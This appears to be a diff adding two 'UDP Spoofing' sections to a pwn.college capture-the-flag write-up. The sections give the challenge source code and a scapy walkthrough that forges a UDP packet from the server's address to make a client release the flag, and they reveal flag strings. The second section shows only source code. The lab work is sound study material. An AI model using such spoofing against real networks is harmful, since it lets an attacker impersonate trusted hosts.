@@ -1457,3 +1457,146 @@ Finished sending 1 packets
 Received 2 packets, got 1 answers, remaining 0 packets
 <IP  version=4 ihl=5 tos=0x0 len=88 id=33942 flags=DF frag=0 ttl=64 proto=udp chksum=0xa1fc src=10.0.0.2 dst=10.0.0.1 |<UDP  sport=31337 dport=31338 len=68 chksum=0x1458 |<Raw  load=b'pwn.college{Mwz35MI1J6GMKGojDTxm77Allz1.QXzQDM2EDL4ITM0EzW}\n' |>>>
 ```
+
+&nbsp;
+
+## UDP Spoofing 1
+
+### Source code
+```py title="/challenge/run" showLineNumbers
+#!/usr/bin/exec-suid --real -- /usr/bin/python -I
+
+import psutil
+import socket
+import time
+import os
+
+from dojjail import Host, Network
+
+flag = open("/flag").read()
+parent_process = psutil.Process(os.getppid())
+
+class ServerHost(Host):
+    def entrypoint(self):
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        server_socket.bind(("0.0.0.0", 31337))
+        while True:
+            try:
+                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
+                if client_message.strip() == b"ACTION?":
+                    server_socket.sendto(b"NONE", (client_host, client_port))
+            except ConnectionError:
+                continue
+
+class ClientHost(Host):
+    def entrypoint(self):
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        client_socket.bind(("0.0.0.0", 31338))
+        while True:
+            try:
+                client_socket.sendto(b"ACTION?", ("10.0.0.3", 31337))
+                message, (peer_host, peer_port) = client_socket.recvfrom(1024)
+                if peer_port == 31337 and message.strip() == b"FLAG":
+                    print(f"YOUR FLAG: {flag}")
+
+                time.sleep(1)
+            except ConnectionError:
+                continue
+
+user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+client_host = ClientHost("ip-10-0-0-2")
+server_host = ServerHost("ip-10-0-0-3")
+network = Network(hosts={user_host: "10.0.0.1", client_host: "10.0.0.2", server_host: "10.0.0.3"}, subnet="10.0.0.0/24")
+network.run()
+
+user_host.interactive(environ=parent_process.environ())
+```
+
+This challenge sets up a virtual network with a client that repeatedly asks a server for an `"ACTION?"` via UDP, expecting a `"FLAG"` response to print the flag. Since the server only replies with `"NONE"`, the goal is to spoof a UDP packet from the server's IP and port to trick the client into printing the flag.
+
+```py
+>>> (IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / Raw(load="FLAG")).display()
+###[ IP ]###
+  version   = 4
+  ihl       = None
+  tos       = 0x0
+  len       = None
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = udp
+  chksum    = None
+  src       = 10.0.0.3
+  dst       = 10.0.0.2
+  \options   \
+###[ UDP ]###
+     sport     = 31337
+     dport     = 31338
+     len       = None
+     chksum    = None
+###[ Raw ]###
+        load      = b'FLAG'
+```
+
+```py
+>>> send(IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / Raw(load="FLAG"))
+.
+Sent 1 packets.
+>>> YOUR FLAG: pwn.college{UuowlpVF-BCfmk1CyhSy_9aopeC.QX0QDM2EDL4ITM0EzW}
+```
+
+&nbsp;
+
+## UDP Spoofing 2
+
+### Source code 
+```py title="/challenge/run" showLineNumbers
+#!/usr/bin/exec-suid --real -- /usr/bin/python -I
+
+import psutil
+import socket
+import time
+import os
+
+from dojjail import Host, Network
+
+flag = open("/flag").read()
+parent_process = psutil.Process(os.getppid())
+
+class ServerHost(Host):
+    def entrypoint(self):
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        server_socket.bind(("0.0.0.0", 31337))
+        while True:
+            try:
+                client_message, (client_host, client_port) = server_socket.recvfrom(1024)
+                if client_message.strip() == b"ACTION?":
+                    server_socket.sendto(b"NONE", (client_host, client_port))
+            except ConnectionError:
+                continue
+
+class ClientHost(Host):
+    def entrypoint(self):
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        client_socket.bind(("0.0.0.0", 31338))
+        while True:
+            time.sleep(1)
+            try:
+                client_socket.sendto(b"ACTION?", ("10.0.0.3", 31337))
+                message, (peer_host, peer_port) = client_socket.recvfrom(1024)
+                if peer_port == 31337 and message.startswith(b"FLAG"):
+                    _, flag_host, flag_port = message.strip().split(b":")
+                    client_socket.sendto(flag.encode(), (flag_host, int(flag_port)))
+            except (ConnectionError, ValueError):
+                continue
+
+user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+client_host = ClientHost("ip-10-0-0-2")
+server_host = ServerHost("ip-10-0-0-3")
+network = Network(hosts={user_host: "10.0.0.1", client_host: "10.0.0.2", server_host: "10.0.0.3"}, subnet="10.0.0.0/24")
+network.run()
+
+user_host.interactive(environ=parent_process.environ())
+```
+
